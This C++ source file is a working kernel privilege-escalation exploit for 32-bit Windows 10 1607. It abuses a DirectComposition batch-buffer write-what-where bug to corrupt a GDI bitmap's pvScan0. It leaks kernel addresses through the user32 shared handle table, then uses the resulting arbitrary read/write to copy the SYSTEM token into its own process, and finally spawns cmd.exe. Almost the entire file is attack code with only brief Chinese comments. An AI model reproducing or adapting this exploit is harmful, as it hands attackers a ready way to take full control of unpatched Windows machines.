/*******************************
* windows 10 1607 x86
*/

#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <iostream>

HBITMAP hManager = NULL;
HBITMAP hWorker = NULL;

typedef ULONG_PTR(__stdcall *NtGdiDdDDIGetContextSchedulingPriority_t)(SIZE_T, SIZE_T);
constexpr int NUM_HANDLES = 1000;
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;


typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
enum DCPROCESSCOMMANDID
{
	nCmdProcessCommandBufferIterator,
	nCmdCreateResource,
	nCmdOpenSharedResource,
	nCmdReleaseResource,
	nCmdGetAnimationTime,
	nCmdCapturePointer,
	nCmdOpenSharedResourceHandle,
	nCmdSetResourceCallbackId,
	nCmdSetResourceIntegerProperty,
	nCmdSetResourceFloatProperty,
	nCmdSetResourceHandleProperty,
	nCmdSetResourceBufferProperty,
	nCmdSetResourceReferenceProperty,
	nCmdSetResourceReferenceArrayProperty,
	nCmdSetResourceAnimationProperty,
	nCmdSetResourceDeletedNotificationTag,
	nCmdAddVisualChild,
	nCmdRedirectMouseToHwnd,
	nCmdSetVisualInputSink,
	nCmdRemoveVisualChild
};
typedef struct _USER_HANDLE_ENTRY {
	void    *pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef NTSTATUS
(NTAPI *NtDCompositionCreateChannel_t)(
	OUT PHANDLE pArgChannelHandle,
	IN OUT PSIZE_T pArgSectionSize,
	OUT PVOID* pArgSectionBaseMapInProcess
	);
typedef NTSTATUS
(NTAPI
	*NtDCompositionProcessChannelBatchBuffer_t)(
		IN HANDLE hChannel,
		IN DWORD dwArgStart,
		OUT PDWORD pOutArg1,
		OUT PDWORD pOutArg2);


typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024
typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}


/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

DWORD32 write_what_where(DWORD32 where, DWORD what)
{
	HANDLE hChannel;
	NTSTATUS ntStatus;
	SIZE_T SectionSize = 0x1000;
	PVOID pMappedAddress = NULL;
	DWORD dwArg1, dwArg2;
	HANDLE hResource = (HANDLE)1;

	//
	// convert to gui thread
	//

	LoadLibrary(TEXT("user32"));

	//
	// create a new channel
	//
	NtDCompositionCreateChannel_t NtDCompositionCreateChannel;
	NtDCompositionProcessChannelBatchBuffer_t NtDCompositionProcessChannelBatchBuffer;
	NtDCompositionCreateChannel = (NtDCompositionCreateChannel_t)GetProcAddress(GetModuleHandle("win32u.dll"), "NtDCompositionCreateChannel");
	NtDCompositionProcessChannelBatchBuffer = (NtDCompositionProcessChannelBatchBuffer_t)GetProcAddress(GetModuleHandle("win32u.dll"), "NtDCompositionProcessChannelBatchBuffer");
	ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);

	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create channel error code:0x%08x"), ntStatus);
		return -1;
	}

	LogMessage(L_INFO, TEXT("Create channel ok, channel=0x%x"), hChannel);

	//
	// create a new resource with type - CPropertyBagMarshaler
	//

	*(DWORD*)(pMappedAddress) = nCmdCreateResource;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)0x70;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;

	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
	if (!NT_SUCCESS(ntStatus)) {
		LogMessage(L_ERROR, TEXT("Create resource error code:0x%08x"), ntStatus);
		return -1;
	}

	//
	// set argument of NtDCompositionProcessChannelBatchBuffer
	//

	UCHAR szBuff[0x18] = {};
	memset(szBuff, 0x41, sizeof(szBuff));
	*(PDWORD32)(szBuff + 2*4) = where;
	*(PDWORD32)(szBuff + 3*4) = 0x23;
	*(PDWORD32)(szBuff + 4*4) = what;
	*(PDWORD32)(szBuff + 5*4) = what;

	*(DWORD*)pMappedAddress = nCmdSetResourceBufferProperty;
	*(HANDLE*)((PUCHAR)pMappedAddress + 4) = hResource;
	*(DWORD*)((PUCHAR)pMappedAddress + 8) = 1;
	*(DWORD*)((PUCHAR)pMappedAddress + 0xc) = sizeof(szBuff);
	CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, sizeof(szBuff));

	//
	// call the function
	//

	LogMessage(L_INFO, TEXT("NtDCompositionSetResourceBufferProperty(0x%x, 0x%x, 0x%x, buf, 0x%x)"), hChannel,
		hResource, 1, sizeof(szBuff));
	ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x14 + sizeof(szBuff), &dwArg1, &dwArg2);

	return 0;
}

DWORD32 leakBitmapPvscan0(HBITMAP *hLeak)
{
	UINT loadCount = 0;
	HACCEL hAccel = NULL;	// 用来重定位的句柄
	LPACCEL lPaccel = NULL;
	int keySize = 700;
	int handleIndex = 0;

	lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * keySize);
	//__debugbreak();
	PSHAREDINFO gdiShraredAddr = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	PUSER_HANDLE_ENTRY gHandleTable = gdiShraredAddr->aheList;
	//std::cout << "[+] hAccel: " << std::hex << hAccel << std::endl;
	//std::cout << "[+] gdiShraedAddr: " << std::hex << gdiShraredAddr << std::endl;
	//std::cout << "[+] gHandleTable: " << std::hex << gHandleTable << std::endl;


	DWORD32 prev = -1;
	DWORD32 curr = 1;
	for (int i = 0; i < 100; i++)
	{
		hAccel = CreateAcceleratorTable(lPaccel, keySize);
		DWORD32 curr = (DWORD32)((PUSER_HANDLE_ENTRY)&gHandleTable[LOWORD(hAccel)])->pKernel;
		DestroyAcceleratorTable(hAccel);
		if (prev == curr)
		{
			*hLeak = CreateBitmap(0x23, 0x6b, 0x1, 0x8, NULL);
			return curr + 0x30;
		}
		prev = curr;
	}
	return 0;
}

// 读操作
VOID readOOB(DWORD32 where, PVOID what, int size)
{
	SetBitmapBits(hManager, size, &where);
	GetBitmapBits(hWorker, size, what);
}

// 写操作
VOID WriteOOB(DWORD32 where, PVOID what, int size)
{
	SetBitmapBits(hManager, size, &where);
	SetBitmapBits(hWorker, size, &what);
}

DWORD32 getKernelModuleAddr(PCHAR Name)
{
	// 获取NtQuerySystemIformation函数
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) 	return NULL;

	// 获取模块的信息
	DWORD len;

	// 使用NtQuerySystemInformation来获取模块长度
	NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(11), NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
	moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!moduleInfo)	return NULL;

	// 获取模块信息
	NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(11), moduleInfo, len, &len);

	for (int i = 0; i < moduleInfo->NumberOfModules; i++)
	{
		LPVOID kernelBase = moduleInfo->Module[i].ImageBase;
		LPVOID kernelImage = moduleInfo->Module[i].FullPathName;
		CONST USHORT OffsetToFileName = moduleInfo->Module[i].OffsetToFileName;

		// debug
		// std::cout << "[+] kernel base at: " << kernelBase << std::endl;
		// std::cout << "[+} kernel name is: " << (char*)kernelImage << std::endl;
		// std::cout << "[+] kernel offset is: " << OffsetToFileName << std::endl;

		char * imageName = (char*)kernelImage + OffsetToFileName;
		if (!strcmp(imageName, Name))
		{
			// debug
			// std::cout << "[+] kernel base at: " << kernelBase << std::endl;
			// std::cout << "[+} kernel name is: " << (char*)kernelImage << std::endl;
			// std::cout << "[+] kernel offset is: " << OffsetToFileName << std::endl;
			return (DWORD32)kernelBase;
		}
	}
}


/*
* getObjectAddrByHadnle:
*	[+] 通过handle获取对象的内核地址
*	[+] handle: 传入的句柄值
*	[+] 返回值: 失败返回-1
*/
ULONG32 getObjectAddrByHandle(HANDLE handle)
{
	DWORD currentProcPID = 0;
	PSYSTEM_HANDLE_INFORMATION_EX ptrHandleInfoList = NULL;	// 句柄信息表
	NTSTATUS status = (NTSTATUS)0xc0000004;
	ULONG len = 20;

	// 初始化相关变量
	currentProcPID = GetProcessId(GetCurrentProcess());	// 获取当前进程PID

	// 使用NtQueryInformation
	_NtQuerySystemInformation NtQuerySystemInformation;
	NtQuerySystemInformation = (_NtQuerySystemInformation)(GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtQuerySystemInformation"));	// nice

	// 循环遍历去获取那张表
	while (status == (NTSTATUS)0xc0000004)
	{
		len *= 2;
		ptrHandleInfoList = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(64), ptrHandleInfoList, len, &len);
	}

	if (status != (NTSTATUS)0)
	{
		std::cout << "Get system information failed" << std::endl;
		return -1;
	}
	HANDLE handleInfoHandle;
	// 遍历去获取相应的值
	for (int i = 0; i < ptrHandleInfoList->HandleCount; i++)
	{
		PVOID addr = ptrHandleInfoList->Handles[i].Object;	// 获取地址
		handleInfoHandle = ptrHandleInfoList->Handles[i].HandleValue;	// 获取遍历的Handle值
		DWORD handleInfoPID = (DWORD)ptrHandleInfoList->Handles[i].UniqueProcessId;	// 获取遍历到的ID值
		if (handleInfoPID == currentProcPID)
		{
			if (handle == handleInfoHandle)
				return (ULONG32)addr;
		}
	}

	return -1;
}

// 替换Token
VOID runShellCode()
{
	// 找到system token的地址
	DWORD32 ntBase = getKernelModuleAddr((PCHAR)"ntoskrnl.exe");
	std::cout << "[+] nt base is: " << std::hex << ntBase << std::endl;
	HMODULE hNtosMod = LoadLibrary("ntoskrnl.exe");
	DWORD32 kernelSaveSystemProcessAddr = ntBase + (DWORD32)GetProcAddress(hNtosMod, "PsInitialSystemProcess") - (DWORD32)hNtosMod;	// 这里读一次就是存放system process 的地址
	
	std::cout << "[+] find system process at here: " << std::hex << kernelSaveSystemProcessAddr << std::endl;

	// 获取system 地址
	DWORD32 systemProcAddr = 0;
	DWORD32 systemTokenValue = 0;
	readOOB(kernelSaveSystemProcessAddr, &systemProcAddr, sizeof(systemProcAddr));
	readOOB(systemProcAddr+0xf4, &systemTokenValue, sizeof(systemTokenValue));	// 获取system token value的值
	//__debugbreak() 获取成功
	std::cout << "[+] System toekn value is: " << std::hex << systemTokenValue << std::endl;	

	// 获取当前的进程的Token地址.
	DWORD currentPID = GetCurrentProcessId();

	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, currentPID);

	ULONG32 tokenAddr = getObjectAddrByHandle(currentProc) + 0xf4;
	//__debugbreak();
	std::cout << "[+] current process token at: " << std::hex <<tokenAddr << std::endl;

	// 写入值
	WriteOOB(tokenAddr, (PVOID)systemTokenValue, sizeof(DWORD32));
}

int main()
{

	//write_what_where();
	DWORD32 hManagerPvScan0 = 0;
	DWORD32 hWorkerPvScan0 = 0;

	std::cout << "[+] hManager Pvscan0: " << std::hex << (hManagerPvScan0 = leakBitmapPvscan0(&hManager)) << std::endl;
	std::cout << "[+] hWorker Pvscan0: " << std::hex << (hWorkerPvScan0 = leakBitmapPvscan0(&hWorker)) << std::endl;

	write_what_where(hManagerPvScan0-0x10, hWorkerPvScan0);	// 替换pvScan0获取readOOB和writeOOB权限 success!!!

	runShellCode();
	std::cout << "[+] pwn by wjllz!!!" << std::endl;
	popCmdToConfirm();
	return 0;
}
